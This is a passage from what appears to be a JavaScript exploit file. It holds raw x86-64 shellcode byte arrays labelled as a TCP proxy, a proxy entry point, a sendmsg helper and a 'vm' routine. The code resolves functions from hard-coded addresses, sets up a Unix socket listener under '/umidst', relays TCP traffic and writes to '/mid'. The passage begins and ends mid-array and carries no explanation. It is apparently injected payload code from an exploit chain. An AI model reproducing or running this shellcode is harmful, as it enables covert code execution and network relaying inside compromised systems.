	0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xA8, 0xB8, 0xF0, 0x4D, 0x29, 0x04, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0x45, 0xA0, 0xB8, 0xF0, 0x69, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 
	0x98, 0xB8, 0x80, 0x4E, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0x90, 0xB8, 0x00, 0x4F, 
	0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0x88, 0xB8, 0x28, 0x28, 0x29, 0x04, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0x45, 0x80, 0xC7, 0x85, 0x7C, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 
	0x8B, 0x45, 0xE8, 0xBA, 0x00, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0xBF, 0x01, 0x00, 
	0x00, 0x00, 0xFF, 0xD0, 0x89, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 0x83, 0xBD, 0x78, 0xFF, 0xFF, 0xFF, 
	0xFF, 0x75, 0x0A, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x7F, 0x01, 0x00, 0x00, 0x66, 0xC7, 0x85, 
	0xF0, 0xFE, 0xFF, 0xFF, 0x01, 0x00, 0xC6, 0x85, 0xF2, 0xFE, 0xFF, 0xFF, 0x2F, 0xC6, 0x85, 0xF3, 
	0xFE, 0xFF, 0xFF, 0x75, 0xC6, 0x85, 0xF4, 0xFE, 0xFF, 0xFF, 0x6D, 0xC6, 0x85, 0xF5, 0xFE, 0xFF, 
	0xFF, 0x69, 0xC6, 0x85, 0xF6, 0xFE, 0xFF, 0xFF, 0x64, 0xC6, 0x85, 0xF7, 0xFE, 0xFF, 0xFF, 0x73, 
	0xC6, 0x85, 0xF8, 0xFE, 0xFF, 0xFF, 0x74, 0xC6, 0x85, 0xF9, 0xFE, 0xFF, 0xFF, 0x00, 0x48, 0x8D, 
	0x85, 0xF0, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x50, 0x02, 0x48, 0x8B, 0x45, 0x80, 0x48, 0x89, 0xD7, 
	0xFF, 0xD0, 0x48, 0x8D, 0x8D, 0xF0, 0xFE, 0xFF, 0xFF, 0x8B, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 0x4C, 
	0x8B, 0x45, 0xC0, 0xBA, 0x6E, 0x00, 0x00, 0x00, 0x48, 0x89, 0xCE, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 
	0x89, 0x85, 0x7C, 0xFF, 0xFF, 0xFF, 0x83, 0xBD, 0x7C, 0xFF, 0xFF, 0xFF, 0x00, 0x74, 0x0A, 0xB8, 
	0x00, 0x00, 0x00, 0x00, 0xE9, 0xF3, 0x00, 0x00, 0x00, 0x8B, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 0x48, 
	0x8B, 0x55, 0xB8, 0xBE, 0x10, 0x00, 0x00, 0x00, 0x89, 0xC7, 0xFF, 0xD2, 0x89, 0x85, 0x7C, 0xFF, 
	0xFF, 0xFF, 0xC7, 0x85, 0xDC, 0xFE, 0xFF, 0xFF, 0x10, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 0xDC, 
	0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x8D, 0xE0, 0xFE, 0xFF, 0xFF, 0x8B, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 
	0x4C, 0x8B, 0x45, 0xB0, 0x48, 0x89, 0xCE, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 0x85, 0x74, 0xFF, 
	0xFF, 0xFF, 0x83, 0xBD, 0x74, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x84, 0x8E, 0x00, 0x00, 0x00, 0x48, 
	0x8B, 0x45, 0x98, 0xBF, 0x18, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x89, 0x85, 0x68, 0xFF, 0xFF, 
	0xFF, 0x48, 0x8B, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x8B, 0x95, 0x74, 0xFF, 0xFF, 0xFF, 0x89, 0x10, 
	0x8B, 0x95, 0xE4, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x89, 0x50, 0x04, 
	0x0F, 0xB7, 0x85, 0xE2, 0xFE, 0xFF, 0xFF, 0x0F, 0xB7, 0xD0, 0x48, 0x8B, 0x85, 0x68, 0xFF, 0xFF, 
	0xFF, 0x89, 0x50, 0x08, 0x48, 0x8B, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x55, 0xF8, 0x48, 
	0x89, 0x50, 0x10, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x05, 0x10, 0xB8, 0xCA, 0x02, 0x48, 0x89, 0x85, 
	0x60, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x8D, 0x68, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x95, 0x60, 0xFF, 
	0xFF, 0xFF, 0x48, 0x8D, 0x85, 0xD0, 0xFE, 0xFF, 0xFF, 0x4C, 0x8B, 0x45, 0xA0, 0xBE, 0x00, 0x00, 
	0x00, 0x00, 0x48, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0xE9, 0x35, 0xFF, 0xFF, 0xFF, 0x90, 0x8B, 0x85, 
	0x78, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x55, 0xA8, 0x89, 0xC7, 0xFF, 0xD2, 0xC9, 0xC3, 0xEB, 0x70
]);



const g_tcp_proxy = Buffer.from([

	0xF3, 0x0F, 0x1E, 0xFA, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x00, 0x10, 0x00, 0x00, 0x48, 
	0x83, 0x0C, 0x24, 0x00, 0x48, 0x81, 0xEC, 0x40, 0x01, 0x00, 0x00, 0x48, 0x89, 0xBD, 0xC8, 0xEE, 
	0xFF, 0xFF, 0x48, 0x8B, 0x85, 0xC8, 0xEE, 0xFF, 0xFF, 0x48, 0x89, 0x45, 0xF8, 0x48, 0x8B, 0x45, 
	0xF8, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x45, 0xF0, 0xB8, 0xF0, 0x57, 
	0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xE8, 0xB8, 0x00, 0x71, 0x29, 0x04, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0x45, 0xE0, 0xB8, 0x18, 0x56, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 
	0xD8, 0xB8, 0x08, 0x55, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xD0, 0xB8, 0xD8, 0x40, 
	0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xC8, 0xB8, 0x70, 0x6A, 0x29, 0x04, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0x45, 0xC0, 0xB8, 0xF0, 0x50, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 
	0xB8, 0xB8, 0x80, 0x4E, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xB0, 0xB8, 0x00, 0x4F, 
	0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xA8, 0xB8, 0xF8, 0x4B, 0x29, 0x04, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0x45, 0xA0, 0xC7, 0x45, 0x9C, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xE8, 
	0xBA, 0x00, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0xBF, 0x02, 0x00, 0x00, 0x00, 0xFF, 
	0xD0, 0x89, 0x45, 0x98, 0x83, 0x7D, 0x98, 0xFF, 0x75, 0x28, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 
	0x48, 0x8B, 0x55, 0xB8, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 0x8B, 0x85, 0xC8, 0xEE, 0xFF, 0xFF, 0x48, 
	0x8B, 0x55, 0xB0, 0x48, 0x89, 0xC7, 0xFF, 0xD2, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x3B, 0x04, 
	0x00, 0x00, 0x48, 0xC7, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 
	0x78, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x66, 0xC7, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x02, 
	0x00, 0xC7, 0x85, 0x74, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xE0, 0xBF, 
	0x50, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x66, 0x89, 0x85, 0x72, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x8D, 
	0x70, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x4C, 0x8B, 0x45, 0xC0, 0xBA, 0x10, 0x00, 0x00, 0x00, 
	0x48, 0x89, 0xCE, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 0x45, 0x9C, 0x83, 0x7D, 0x9C, 0x00, 0x74, 
	0x28, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x48, 0x8B, 0x55, 0xB8, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 
	0x8B, 0x85, 0xC8, 0xEE, 0xFF, 0xFF, 0x48, 0x8B, 0x55, 0xB0, 0x48, 0x89, 0xC7, 0xFF, 0xD2, 0xB8, 
	0x00, 0x00, 0x00, 0x00, 0xE9, 0xB4, 0x03, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 
	0x03, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 
	0x8D, 0x95, 0x60, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x4C, 0x8B, 0x4D, 0xA8, 0x41, 0xB8, 0x10, 
	0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 0xBA, 0x15, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 
	0x89, 0xC7, 0x41, 0xFF, 0xD1, 0x48, 0x8D, 0x95, 0x60, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x4C, 
	0x8B, 0x4D, 0xA8, 0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 0xBA, 0x14, 0x00, 0x00, 
	0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD1, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 
	0x00, 0x48, 0x8D, 0x95, 0x60, 0xFF, 0xFF, 0xFF, 0x4C, 0x8B, 0x4D, 0xA8, 0x41, 0xB8, 0x10, 0x00, 
	0x00, 0x00, 0x48, 0x89, 0xD1, 0xBA, 0x15, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x89, 
	0xC7, 0x41, 0xFF, 0xD1, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x48, 0x8D, 0x95, 0x60, 0xFF, 0xFF, 
	0xFF, 0x4C, 0x8B, 0x4D, 0xA8, 0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 0xBA, 0x14, 
	0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD1, 0x48, 0xC7, 0x85, 
	0x50, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x58, 0xFF, 0xFF, 0xFF, 0x00, 
	0x00, 0x00, 0x00, 0x66, 0xC7, 0x85, 0x50, 0xFF, 0xFF, 0xFF, 0x02, 0x00, 0x48, 0x8B, 0x45, 0xF8, 
	0x48, 0x8B, 0x40, 0x10, 0x8B, 0x00, 0x89, 0x85, 0x54, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x45, 0xF8, 
	0x48, 0x8B, 0x40, 0x10, 0x8B, 0x40, 0x04, 0x66, 0x89, 0x85, 0x52, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 
	0x8D, 0x50, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x4C, 0x8B, 0x45, 0xD8, 0xBA, 0x10, 0x00, 0x00, 
	0x00, 0x48, 0x89, 0xCE, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 0x45, 0x9C, 0x83, 0x7D, 0x9C, 0x00, 
	0x74, 0x33, 0x8B, 0x45, 0x98, 0x48, 0x8B, 0x55, 0xB8, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 0x8B, 0x45, 
	0xF8, 0x8B, 0x00, 0x48, 0x8B, 0x55, 0xB8, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 0x8B, 0x85, 0xC8, 0xEE, 
	0xFF, 0xFF, 0x48, 0x8B, 0x55, 0xB0, 0x48, 0x89, 0xC7, 0xFF, 0xD2, 0xB8, 0x00, 0x00, 0x00, 0x00, 
	0xE9, 0x68, 0x02, 0x00, 0x00, 0xC7, 0x45, 0x94, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xF8, 
	0x8B, 0x00, 0x39, 0x45, 0x98, 0x7F, 0x08, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0xEB, 0x03, 0x8B, 
	0x45, 0x98, 0x89, 0x45, 0x90, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xB9, 0x10, 0x00, 0x00, 0x00, 0x48, 
	0x8D, 0x95, 0xD0, 0xEE, 0xFF, 0xFF, 0x48, 0x89, 0xD7, 0xFC, 0xF3, 0x48, 0xAB, 0x89, 0xF8, 0x89, 
	0xCA, 0x89, 0x55, 0x8C, 0x89, 0x45, 0x88, 0x8B, 0x45, 0x98, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 
	0x48, 0xC2, 0xC1, 0xF8, 0x06, 0x89, 0xC6, 0x48, 0x63, 0xC6, 0x48, 0x8B, 0xBC, 0xC5, 0xD0, 0xEE, 
	0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x99, 0xC1, 0xEA, 0x1A, 0x01, 0xD0, 0x83, 0xE0, 0x3F, 0x29, 0xD0, 
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC1, 0x48, 0xD3, 0xE2, 0x48, 0x89, 0xD0, 0x48, 0x09, 0xC7, 
	0x48, 0x89, 0xFA, 0x48, 0x63, 0xC6, 0x48, 0x89, 0x94, 0xC5, 0xD0, 0xEE, 0xFF, 0xFF, 0x48, 0x8B, 
	0x45, 0xF8, 0x8B, 0x00, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 0xC1, 0xF8, 0x06, 0x89, 
	0xC6, 0x48, 0x63, 0xC6, 0x48, 0x8B, 0xBC, 0xC5, 0xD0, 0xEE, 0xFF, 0xFF, 0x48, 0x8B, 0x45, 0xF8, 
	0x8B, 0x00, 0x99, 0xC1, 0xEA, 0x1A, 0x01, 0xD0, 0x83, 0xE0, 0x3F, 0x29, 0xD0, 0xBA, 0x01, 0x00, 
	0x00, 0x00, 0x89, 0xC1, 0x48, 0xD3, 0xE2, 0x48, 0x89, 0xD0, 0x48, 0x09, 0xC7, 0x48, 0x89, 0xFA, 
	0x48, 0x63, 0xC6, 0x48, 0x89, 0x94, 0xC5, 0xD0, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0x90, 0x8D, 0x78, 
	0x01, 0x48, 0x8D, 0x85, 0xD0, 0xEE, 0xFF, 0xFF, 0x4C, 0x8B, 0x4D, 0xA0, 0x41, 0xB8, 0x00, 0x00, 
	0x00, 0x00, 0xB9, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC6, 0x41, 
	0xFF, 0xD1, 0x89, 0x45, 0x9C, 0x83, 0x7D, 0x9C, 0x00, 0x0F, 0x8E, 0xFD, 0xFE, 0xFF, 0xFF, 0x8B, 
	0x45, 0x98, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 0xC1, 0xF8, 0x06, 0x48, 0x98, 0x48, 
	0x8B, 0xB4, 0xC5, 0xD0, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x99, 0xC1, 0xEA, 0x1A, 0x01, 0xD0, 
	0x83, 0xE0, 0x3F, 0x29, 0xD0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC1, 0x48, 0xD3, 0xE2, 0x48, 
	0x89, 0xD0, 0x48, 0x21, 0xF0, 0x48, 0x85, 0xC0, 0x74, 0x5B, 0x8B, 0x45, 0x94, 0x8D, 0x50, 0xFF, 
	0x48, 0x8D, 0xB5, 0x50, 0xEF, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x4C, 0x8B, 0x45, 0xC8, 0xB9, 0x00, 
	0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 0x45, 0x84, 0x83, 0x7D, 0x84, 0x00, 0x0F, 
	0x8E, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x8B, 0x55, 0x84, 0x48, 0x8D, 
	0xB5, 0x50, 0xEF, 0xFF, 0xFF, 0x4C, 0x8B, 0x45, 0xD0, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x89, 0xC7, 
	0x41, 0xFF, 0xD0, 0x89, 0x45, 0x80, 0x83, 0x7D, 0x80, 0x00, 0x0F, 0x8F, 0x6C, 0xFE, 0xFF, 0xFF, 
	0xE9, 0x9F, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 
	0x0F, 0x48, 0xC2, 0xC1, 0xF8, 0x06, 0x48, 0x98, 0x48, 0x8B, 0xB4, 0xC5, 0xD0, 0xEE, 0xFF, 0xFF, 
	0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x99, 0xC1, 0xEA, 0x1A, 0x01, 0xD0, 0x83, 0xE0, 0x3F, 0x29, 
	0xD0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC1, 0x48, 0xD3, 0xE2, 0x48, 0x89, 0xD0, 0x48, 0x21, 
	0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x22, 0xFE, 0xFF, 0xFF, 0x8B, 0x45, 0x94, 0x8D, 0x50, 0xFF, 
	0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x48, 0x8D, 0xB5, 0x50, 0xEF, 0xFF, 0xFF, 0x4C, 0x8B, 0x45, 
	0xC8, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 0x45, 0x84, 0x83, 0x7D, 
	0x84, 0x00, 0x7E, 0x2C, 0x8B, 0x55, 0x84, 0x48, 0x8D, 0xB5, 0x50, 0xEF, 0xFF, 0xFF, 0x8B, 0x45, 
	0x98, 0x4C, 0x8B, 0x45, 0xD0, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 
	0x45, 0x80, 0x83, 0x7D, 0x80, 0x00, 0x7E, 0x0B, 0xE9, 0xCF, 0xFD, 0xFF, 0xFF, 0x90, 0xEB, 0x04, 
	0x90, 0xEB, 0x01, 0x90, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x48, 0x8B, 0x55, 0xB8, 0x89, 0xC7, 
	0xFF, 0xD2, 0x8B, 0x45, 0x98, 0x48, 0x8B, 0x55, 0xB8, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 0x8B, 0x85, 
	0xC8, 0xEE, 0xFF, 0xFF, 0x48, 0x8B, 0x55, 0xB0, 0x48, 0x89, 0xC7, 0xFF, 0xD2, 0xC9, 0xC3, 0xE9
]);

const g_proxy_entry = Buffer.from([

	0xF3, 0x0F, 0x1E, 0xFA, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x80, 0x05, 0x00, 0x00, 0x48, 
	0xC7, 0x45, 0xF8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 
	0x45, 0xF8, 0x48, 0x8B, 0x45, 0xF8, 0x48, 0xBA, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 
	0x48, 0x21, 0xD0, 0x48, 0x05, 0x00, 0x02, 0x00, 0x00, 0x48, 0x89, 0x45, 0xF0, 0x48, 0x8B, 0x45, 
	0xF0, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xE8, 0x48, 0x8B, 0x45, 0xE8, 0x48, 0x05, 0x80, 0x8B, 
	0x44, 0x00, 0x48, 0x89, 0x45, 0xE0, 0xB8, 0xF0, 0x4D, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 
	0x45, 0xD8, 0xB8, 0x60, 0x6D, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xD0, 0xB8, 0xE0, 
	0x57, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xC8, 0xB8, 0xF0, 0x50, 0x29, 0x04, 0x48, 
	0x8B, 0x00, 0x48, 0x89, 0x45, 0xC0, 0xB8, 0xB0, 0x42, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 
	0x45, 0xB8, 0x48, 0xC7, 0x45, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x45, 0xE0, 0x80, 0x8B, 
	0x44, 0x00, 0x48, 0x8B, 0x45, 0xE8, 0x48, 0x05, 0xE0, 0x31, 0x4D, 0x00, 0x48, 0x89, 0x45, 0xB0, 
	0x48, 0x8B, 0x4D, 0xE0, 0x48, 0x8B, 0x55, 0xB0, 0x48, 0x8D, 0x45, 0x90, 0x4C, 0x8B, 0x45, 0xD8, 
	0xBE, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x48, 0x8B, 0x45, 0xE8, 0x48, 
	0x05, 0x10, 0xC8, 0x4D, 0x00, 0x48, 0x89, 0x45, 0xA8, 0x48, 0x8B, 0x4D, 0xE0, 0x48, 0x8B, 0x55, 
	0xA8, 0x48, 0x8D, 0x45, 0x88, 0x4C, 0x8B, 0x45, 0xD8, 0xBE, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 
	0xC7, 0x41, 0xFF, 0xD0, 0xC6, 0x85, 0x80, 0xFE, 0xFF, 0xFF, 0x2F, 0xC6, 0x85, 0x81, 0xFE, 0xFF, 
	0xFF, 0x6D, 0xC6, 0x85, 0x82, 0xFE, 0xFF, 0xFF, 0x69, 0xC6, 0x85, 0x83, 0xFE, 0xFF, 0xFF, 0x64, 
	0xC6, 0x85, 0x84, 0xFE, 0xFF, 0xFF, 0x00, 0x48, 0x8D, 0x85, 0x80, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 
	0x4D, 0xC8, 0xBA, 0xA4, 0x01, 0x00, 0x00, 0xBE, 0x41, 0x04, 0x00, 0x00, 0x48, 0x89, 0xC7, 0xFF, 
	0xD1, 0x89, 0x45, 0xA4, 0x48, 0x8D, 0x8D, 0x80, 0xFE, 0xFF, 0xFF, 0x8B, 0x45, 0xA4, 0x4C, 0x8B, 
	0x45, 0xD0, 0xBA, 0x04, 0x00, 0x00, 0x00, 0x48, 0x89, 0xCE, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x48, 
	0x89, 0x45, 0x98, 0x8B, 0x45, 0xA4, 0x48, 0x8B, 0x55, 0xC0, 0x89, 0xC7, 0xFF, 0xD2, 0x90, 0xC9, 
	0xC3, 0xE9, 0x9A, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00

]);

const g_code_sendmsg = Buffer.from([
	0x55, 0x48, 0x89, 0xE5, 0x89, 0x7D, 0xDC, 0x48, 0x89, 0x75, 0xD0, 0x89, 0x55, 0xD8, 0xC7, 0x45, 
	0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xD0, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x45, 
	0xF0, 0x48, 0x8B, 0x45, 0xD0, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x45, 0xF8, 0xC7, 0x45, 0xEC, 
	0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xF8, 0x39, 0x45, 0xEC, 0x7D, 0x20, 0x8B, 0x45, 0xEC, 
	0x48, 0x98, 0x48, 0xC1, 0xE0, 0x04, 0x48, 0x89, 0xC2, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x01, 0xD0, 
	0x48, 0x8B, 0x40, 0x08, 0x01, 0x45, 0xE8, 0x83, 0x45, 0xEC, 0x01, 0xEB, 0xD7, 0x8B, 0x45, 0xE8, 
	0x5D, 0xC3]);
	
	
const g_code_11910A0_vm = Buffer.from([

	0xF3, 0x0F, 0x1E, 0xFA, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0xB0, 0x01, 0x00, 0x00, 0x48, 
	0x89, 0xBD, 0x58, 0xFE, 0xFF, 0xFF, 0x89, 0xB5, 0x54, 0xFE, 0xFF, 0xFF, 0x89, 0x95, 0x50, 0xFE, 
	0xFF, 0xFF, 0x64, 0x48, 0x8B, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0xF8, 0x31, 
	0xC0, 0xC7, 0x85, 0x68, 0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xB8, 0xB8, 0x45, 0x29, 0x04, 
	0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0xB0, 0xFE, 0xFF, 0xFF, 0xB8, 0x20, 0x30, 0x29, 0x04, 0x48, 
	0x8B, 0x00, 0x48, 0x89, 0x85, 0xB8, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0xB0, 0xFE, 0xFF, 0xFF, 
	0x48, 0x89, 0x85, 0xC0, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0xB8, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 
	0x85, 0xC8, 0xFE, 0xFF, 0xFF, 0x48, 0xC7, 0x85, 0xD0, 0xFE, 0xFF, 0xFF, 0xA0, 0xF6, 0xBB, 0x02, 
	0x48, 0xC7, 0x85, 0xD8, 0xFE, 0xFF, 0xFF, 0xA0, 0x10, 0x19, 0x01, 0x48, 0xC7, 0x85, 0xE0, 0xFE, 
	0xFF, 0xFF, 0x70, 0x60, 0xA1, 0x02, 0x48, 0xC7, 0x85, 0xE8, 0xFE, 0xFF, 0xFF, 0xE0, 0x70, 0x19, 
	0x01, 0x48, 0xC7, 0x85, 0xF0, 0xFE, 0xFF, 0xFF, 0xB0, 0x2D, 0xA0, 0x02, 0x48, 0xC7, 0x85, 0xF8, 
	0xFE, 0xFF, 0xFF, 0x40, 0x3C, 0x19, 0x01, 0x48, 0xC7, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x50, 0x3B, 
	0x9F, 0x02, 0x48, 0x8B, 0x85, 0x58, 0xFE, 0xFF, 0xFF, 0x48, 0x05, 0x08, 0x2A, 0x00, 0x00, 0x48, 
	0x89, 0x85, 0x98, 0xFE, 0xFF, 0xFF, 0x83, 0xBD, 0x50, 0xFE, 0xFF, 0xFF, 0x01, 0x75, 0x14, 0x48, 
	0x8B, 0x85, 0x58, 0xFE, 0xFF, 0xFF, 0x48, 0x05, 0x98, 0x48, 0x00, 0x00, 0x48, 0x89, 0x85, 0x98, 
	0xFE, 0xFF, 0xFF, 0x8B, 0x85, 0x54, 0xFE, 0xFF, 0xFF, 0x48, 0x63, 0xD0, 0x48, 0x89, 0xD0, 0x48, 
	0xC1, 0xE0, 0x03, 0x48, 0x01, 0xD0, 0x48, 0xC1, 0xE0, 0x02, 0x48, 0x01, 0xD0, 0x48, 0xC1, 0xE0, 
	0x03, 0x48, 0x89, 0xC2, 0x48, 0x8B, 0x85, 0x98, 0xFE, 0xFF, 0xFF, 0x48, 0x01, 0xD0, 0x48, 0x89, 
	0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xE8, 0x80, 
	0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0x10, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x08, 0xFF, 0xFF, 
	0xFF, 0x48, 0x05, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x10, 0x48, 0x8B, 0x85, 0x10, 0xFF, 0xFF, 
